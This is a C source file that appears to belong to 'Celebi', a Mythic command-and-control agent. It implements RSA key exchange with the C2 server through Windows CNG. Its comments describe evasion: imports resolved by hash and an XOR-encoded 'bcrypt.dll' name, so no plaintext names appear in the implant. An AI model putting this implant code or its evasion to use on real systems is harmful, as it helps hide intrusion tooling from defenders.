/*
 * ecke.c — RSA Encrypted Key Exchange (staging_rsa) for Celebi.
 *
 * Uses Windows CNG (bcrypt.dll) at runtime:
 *   - generates an ephemeral 4096-bit RSA keypair
 *   - exports the public key as base64(PKCS#1 RSAPublicKey DER) for Mythic
 *   - decrypts the RSA-OAEP(SHA-1) wrapped session AES key
 *
 * The DER building is pure C and host-testable (see test_ecke.c).
 */

#include <windows.h>
#include "headers/celebi.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI size_t MSVCRT$strlen(const char *str);

/* provided by main.c */
void base64_encode(const char *in, const unsigned long in_len, char *out);
int base64_decode(const char *in, const unsigned long in_len, char *out);

/* bcrypt imports resolved by hash (ror13, see linker.spec dfr list) — no
 * plaintext module/function names in the PIC. Load bcrypt.dll first via
 * load_module_xor() (its name is XOR-encoded). */
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGenerateKeyPair(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinalizeKeyPair(BCRYPT_KEY_HANDLE, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptExportKey(BCRYPT_KEY_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG *, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
typedef struct {
	LPCWSTR pszAlgId;
	PUCHAR pbLabel;
	ULONG cbLabel;
} EKE_OAEP_PADDING_INFO;

#define BCRYPT_RSAPUBLIC_MAGIC 0x31415352 /* "RSA1" */

static void memcpy_le32(unsigned long *dst, const unsigned char *src) {
	unsigned char *d = (unsigned char *)dst;
	d[0] = src[0]; d[1] = src[1]; d[2] = src[2]; d[3] = src[3];
}

/* ============================================================
 * DER encoding (pure C, host-testable)
 * ============================================================ */

static int der_encode_length(unsigned char *out, size_t len) {
	if (len < 0x80) {
		out[0] = (unsigned char)len;
		return 1;
	}
	unsigned char tmp[8];
	int n = 0;
	unsigned long long l = len;
	while (l > 0) {
		tmp[n++] = (unsigned char)(l & 0xff);
		l >>= 8;
	}
	out[0] = (unsigned char)(0x80 | n);
	for (int i = 0; i < n; i++) {
		out[1 + i] = tmp[n - 1 - i];
	}
	return 1 + n;
}

/* INTEGER from big-endian bytes; strips leading zeros, adds 0x00 when the high bit is set */
static int der_encode_integer(unsigned char *out, const unsigned char *be, int be_len) {
	int start = 0;
	while (start < be_len - 1 && be[start] == 0) {
		start++;
	}
	int content = be_len - start;
	if (be[start] & 0x80) {
		content++;
	}
	int off = 0;
	out[off++] = 0x02;
	off += der_encode_length(out + off, (size_t)content);
	if (be[start] & 0x80) {
		out[off++] = 0x00;
	}
	for (int i = 0; i < be_len - start; i++) {
		out[off++] = be[start + i];
	}
	return off;
}

static int der_encode_sequence(unsigned char *out, const unsigned char *inner, int inner_len) {
	int off = 0;
	out[off++] = 0x30;
	off += der_encode_length(out + off, (size_t)inner_len);
	for (int i = 0; i < inner_len; i++) {
		out[off++] = inner[i];
	}
	return off;
}

/*
 * Parse a BCRYPT_RSAPUBLIC_BLOB and emit base64(PKCS#1 RSAPublicKey DER).
 *
 * Layout (per the BCRYPT_RSAKEY_BLOB docs): 6 ULONG header
 *   [Magic "RSA1"][BitLength][cbPublicExp][cbModulus][cbPrime1][cbPrime2]
 * followed by PublicExponent[cbPublicExp] then Modulus[cbModulus], both
 * BIG-ENDIAN. Returns 0 on success, -1 on error.
 */
int eke_pubkey_b64_from_blob(const unsigned char *blob, unsigned long blob_len, char *out_b64, int out_cap) {
	if (blob_len < 24) {
		return -1;
	}
	unsigned long magic, bitlen, cbExp, cbMod, cbP1, cbP2;
	memcpy_le32(&magic, blob + 0);
	memcpy_le32(&bitlen, blob + 4);
	memcpy_le32(&cbExp, blob + 8);
	memcpy_le32(&cbMod, blob + 12);
	memcpy_le32(&cbP1, blob + 16);
	memcpy_le32(&cbP2, blob + 20);

	if (magic != BCRYPT_RSAPUBLIC_MAGIC || cbExp == 0 || cbMod == 0 || cbExp > 64 || cbMod > 1024) {
		return -1;
	}
	if (24 + cbExp + cbMod > blob_len) {
		return -1;
	}
	(void)bitlen; (void)cbP1; (void)cbP2;

	const unsigned char *exp_le = blob + 24;
	const unsigned char *mod_le = exp_le + cbExp;

	/* Heap buffers: keeps the stack frame small (no mingw ___chkstk_ms probe,
	 * which cannot be relocated in a PIC). */
	unsigned char *exp_be = (unsigned char *)KERNEL32$VirtualAlloc(0, cbExp, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	unsigned char *mod_be = (unsigned char *)KERNEL32$VirtualAlloc(0, cbMod, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	unsigned char *inner = (unsigned char *)KERNEL32$VirtualAlloc(0, cbExp + cbMod + 16, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	unsigned char *der = (unsigned char *)KERNEL32$VirtualAlloc(0, cbExp + cbMod + 32, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (exp_be == NULL || mod_be == NULL || inner == NULL || der == NULL) {
		if (exp_be) { KERNEL32$VirtualFree(exp_be, 0, MEM_RELEASE); }
		if (mod_be) { KERNEL32$VirtualFree(mod_be, 0, MEM_RELEASE); }
		if (inner) { KERNEL32$VirtualFree(inner, 0, MEM_RELEASE); }
		if (der) { KERNEL32$VirtualFree(der, 0, MEM_RELEASE); }
		return -1;
	}

	/* The blob stores the exponent and modulus big-endian already; copy as-is. */
	for (unsigned long i = 0; i < cbExp; i++) {
		exp_be[i] = exp_le[i];
	}
	for (unsigned long i = 0; i < cbMod; i++) {
		mod_be[i] = mod_le[i];
	}

	/* DER: SEQUENCE { INTEGER modulus, INTEGER exponent } (PKCS#1 RSAPublicKey) */
	int inner_len = 0;
	inner_len += der_encode_integer(inner + inner_len, mod_be, (int)cbMod);
	inner_len += der_encode_integer(inner + inner_len, exp_be, (int)cbExp);
	int der_len = der_encode_sequence(der, inner, inner_len);

	/* base64 */
	int b64_len = ((der_len * 4) / 3) + 5;
	if (b64_len >= out_cap) {
		KERNEL32$VirtualFree(exp_be, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(mod_be, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(inner, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(der, 0, MEM_RELEASE);
		return -1;
	}
	base64_encode((const char *)der, (unsigned long)der_len, out_b64);

	KERNEL32$VirtualFree(exp_be, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(mod_be, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(inner, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(der, 0, MEM_RELEASE);
	return 0;
}

/* ============================================================
 * Runtime bcrypt helpers
 * ============================================================ */

/* "bcrypt.dll" ^ 0x37 — no plaintext module names in the binary. */
static const unsigned char BCRYPT_DLL_XOR[] = {0x55, 0x54, 0x45, 0x4e, 0x47, 0x43, 0x19, 0x53, 0x5b, 0x5b};

/*
 * Generate a fresh RSA keypair and build the base64 PKCS#1 public key.
 * Returns 0 on success.
 */
int eke_init(EKE_RSA *rsa) {
	NTSTATUS status;

	if (rsa == NULL) {
		return -1;
	}

	/* Load bcrypt.dll (XOR-encoded name) before the hashed BCRYPT$ calls. */
	load_module_xor(BCRYPT_DLL_XOR, sizeof(BCRYPT_DLL_XOR), 0x37);

	status = BCRYPT$BCryptOpenAlgorithmProvider(&rsa->alg, L"RSA", NULL, 0);
	if (status != 0) {
		return -1;
	}
	status = BCRYPT$BCryptGenerateKeyPair(rsa->alg, &rsa->key, 4096, 0);
	if (status != 0) {
		BCRYPT$BCryptCloseAlgorithmProvider(rsa->alg, 0);
		rsa->alg = NULL;
		return -1;
	}
	status = BCRYPT$BCryptFinalizeKeyPair(rsa->key, 0);
	if (status != 0) {
		BCRYPT$BCryptDestroyKey(rsa->key);
		rsa->key = NULL;
		BCRYPT$BCryptCloseAlgorithmProvider(rsa->alg, 0);
		rsa->alg = NULL;
		return -1;
	}

	/* export the public blob (size query, then real export) */
	ULONG need = 0;
	status = BCRYPT$BCryptExportKey(rsa->key, NULL, L"RSAPUBLICBLOB", NULL, 0, &need, 0);
	if (status != 0 || need == 0) {
		return -1;
	}
	char *blob = (char *)KERNEL32$VirtualAlloc(0, need, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (blob == NULL) {
		return -1;
	}
	status = BCRYPT$BCryptExportKey(rsa->key, NULL, L"RSAPUBLICBLOB", (PUCHAR)blob, need, &need, 0);
	if (status != 0) {
		KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
		return -1;
	}

	int b64_cap = ((need * 4) / 3) + 8;
	rsa->pubkey_b64 = (char *)KERNEL32$VirtualAlloc(0, b64_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (rsa->pubkey_b64 == NULL || eke_pubkey_b64_from_blob((const unsigned char *)blob, need, rsa->pubkey_b64, b64_cap) != 0) {
		KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
		return -1;
	}
	KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
	return 0;
}

/*
 * Decrypt the RSA-OAEP(SHA-1) wrapped session key.
 * session_key_b64: base64 of the ciphertext from Mythic's staging_rsa response.
 * out must hold 32 bytes. Returns 0 on success.
 */
int eke_decrypt_session_key(EKE_RSA *rsa, const char *session_key_b64, unsigned char out[32]) {
	size_t b64_len = MSVCRT$strlen(session_key_b64);
	if (b64_len == 0) {
		return -1;
	}
	size_t buf_len = (b64_len / 4) * 3 + 3;
	char *buf = (char *)KERNEL32$VirtualAlloc(0, buf_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (buf == NULL) {
		return -1;
	}
	if (base64_decode(session_key_b64, b64_len, buf) != 0) {
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		return -1;
	}
	size_t ct_len = (b64_len / 4) * 3;
	if (b64_len > 0 && session_key_b64[b64_len - 1] == '=') { ct_len--; }
	if (b64_len > 1 && session_key_b64[b64_len - 2] == '=') { ct_len--; }

	EKE_OAEP_PADDING_INFO pad;
	pad.pszAlgId = L"SHA1";
	pad.pbLabel = NULL;
	pad.cbLabel = 0;

	ULONG need = 0;
	NTSTATUS status = BCRYPT$BCryptDecrypt(rsa->key, (PUCHAR)buf, (ULONG)ct_len, &pad, NULL, 0, NULL, 0, &need, 0);
	if (status != 0 || need == 0 || need > 256) {
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		return -1;
	}
	char *plain = (char *)KERNEL32$VirtualAlloc(0, need, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (plain == NULL) {
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		return -1;
	}
	status = BCRYPT$BCryptDecrypt(rsa->key, (PUCHAR)buf, (ULONG)ct_len, &pad, NULL, 0, (PUCHAR)plain, need, &need, 0);
	if (status != 0 || need != 32) {
		KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
		KERNEL32$VirtualFree(plain, 0, MEM_RELEASE);
		return -1;
	}
	for (int i = 0; i < 32; i++) {
		out[i] = (unsigned char)plain[i];
	}
	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(plain, 0, MEM_RELEASE);
	return 0;
}

void eke_cleanup(EKE_RSA *rsa) {
	if (rsa == NULL) {
		return;
	}
	if (rsa->key != NULL) {
		BCRYPT$BCryptDestroyKey(rsa->key);
		rsa->key = NULL;
	}
	if (rsa->alg != NULL) {
		BCRYPT$BCryptCloseAlgorithmProvider(rsa->alg, 0);
		rsa->alg = NULL;
	}
	if (rsa->pubkey_b64 != NULL) {
		KERNEL32$VirtualFree(rsa->pubkey_b64, 0, MEM_RELEASE);
		rsa->pubkey_b64 = NULL;
	}
}
